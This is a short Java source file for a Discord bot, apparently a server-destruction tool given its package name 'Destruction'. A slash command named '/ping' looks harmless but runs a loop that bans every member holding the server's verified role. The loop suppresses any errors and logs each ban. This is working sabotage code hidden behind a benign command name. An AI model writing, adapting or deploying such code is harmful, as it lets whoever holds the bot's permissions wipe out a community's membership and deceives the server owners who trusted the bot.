package eu.xevix.bot.Destruction;

import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

import java.util.List;
public class banalll extends ListenerAdapter {
    @Override
    public void onSlashCommandInteraction(@NotNull SlashCommandInteractionEvent event) {
        if (event.getName().equals("ping")) {
            String roleName = "\uD83D\uDD30・ZWERYFIKOWANY/A";

            Role role = event.getGuild().getRolesByName(roleName, true).stream().findFirst().orElse(null);
            if (role == null) {
                System.out.println("Nie ma takiej roli na serverze");
                return;
            }

            List<Member> membersWithRole = event.getGuild().getMembersWithRoles(role);
            for (Member member : membersWithRole) {
                try{
                    member.ban(0, "powód").queue();
                }
                catch(java.lang.Exception e) {}
                System.out.println(member);
            }




        }






    }
}